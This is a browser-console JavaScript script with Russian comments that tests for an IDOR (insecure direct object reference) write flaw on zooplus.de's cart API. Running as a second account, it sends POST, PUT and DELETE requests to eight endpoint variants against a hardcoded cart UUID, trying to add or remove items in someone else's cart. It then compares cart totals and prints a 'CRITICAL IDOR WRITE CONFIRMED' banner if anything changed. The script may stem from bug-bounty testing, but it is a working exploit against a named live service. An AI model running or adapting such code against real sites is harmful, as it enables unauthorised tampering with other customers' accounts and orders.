// Альтернативные варианты тестирования модификации корзины
// Выполните в консоли браузера под Account B

const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";
const OFFER_ID = 2966095;
const ARTICLE_ID = 2966422; // Существующий товар в корзине

console.log("[*] Testing alternative cart modification endpoints...");

// Получить текущее состояние
fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
  credentials: 'include'
})
.then(r => r.json())
.then(cart => {
  window.beforeCount = cart.articles.length;
  window.beforeTotal = cart.summary.grandTotal;
  console.log(`[+] Cart before: ${window.beforeCount} items, ${window.beforeTotal} EUR`);
  
  // Попробовать все варианты endpoints
  const tests = [
    // Вариант 1: v1 API
    fetch(`https://www.zooplus.de/checkout/api/cart-api/v1/cart/${CART_UUID}/articles`, {
      method: "POST",
      credentials: "include",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({offerId: OFFER_ID})
    }),
    
    // Вариант 2: Без /v2
    fetch(`https://www.zooplus.de/checkout/api/cart-api/cart/${CART_UUID}/articles`, {
      method: "POST",
      credentials: "include",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({offerId: OFFER_ID})
    }),
    
    // Вариант 3: Через update endpoint
    fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}/update`, {
      method: "POST",
      credentials: "include",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({articles: [{offerId: OFFER_ID, quantity: 1}]})
    }),
    
    // Вариант 4: PUT на основной endpoint
    fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
      method: "PUT",
      credentials: "include",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({action: "add", offerId: OFFER_ID})
    }),
    
    // Вариант 5: Удаление через quantity=0
    fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}/articles/${ARTICLE_ID}`, {
      method: "PUT",
      credentials: "include",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({quantity: 0})
    }),
    
    // Вариант 6: DELETE article
    fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}/articles/${ARTICLE_ID}`, {
      method: "DELETE",
      credentials: "include"
    }),
    
    // Вариант 7: POST с action в body
    fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
      method: "POST",
      credentials: "include",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({action: "addArticle", offerId: OFFER_ID})
    }),
    
    // Вариант 8: Через state API
    fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/cart/${CART_UUID}`, {
      method: "POST",
      credentials: "include",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({action: "add", offerId: OFFER_ID})
    }),
  ];
  
  return Promise.allSettled(tests.map((p, i) => 
    p.then(r => {
      console.log(`Test ${i+1}: HTTP ${r.status}`);
      if (r.status === 200 || r.status === 201 || r.status === 204) {
        console.log(`  [!!!] SUCCESS! Test ${i+1} returned ${r.status}`);
        return r.text().then(text => {
          console.log(`  Response: ${text.substring(0, 300)}`);
          return {success: true, test: i+1, status: r.status};
        });
      }
      return {success: false, test: i+1, status: r.status};
    }).catch(e => {
      console.log(`Test ${i+1}: Error - ${e.message}`);
      return {success: false, test: i+1, error: e.message};
    })
  ));
})
.then(results => {
  console.log("\n[*] All tests completed. Checking cart...");
  
  // Проверить корзину
  return fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
    credentials: 'include'
  });
})
.then(r => r.json())
.then(cart => {
  const afterCount = cart.articles.length;
  const afterTotal = cart.summary.grandTotal;
  console.log(`[+] Cart after: ${afterCount} items, ${afterTotal} EUR`);
  
  if (afterCount !== window.beforeCount || Math.abs(afterTotal - window.beforeTotal) > 0.01) {
    console.log("\n[!!!] ========================================");
    console.log("[!!!] CRITICAL IDOR WRITE CONFIRMED!");
    console.log("[!!!] ========================================");
    console.log(`[!!!] Before: ${window.beforeCount} items, ${window.beforeTotal} EUR`);
    console.log(`[!!!] After:  ${afterCount} items, ${afterTotal} EUR`);
  } else {
    console.log("[!] Cart unchanged - all write endpoints returned 404/405");
    console.log("[!] Write operations may be protected or use different API structure");
  }
})
.catch(e => console.error("[!] Error:", e));

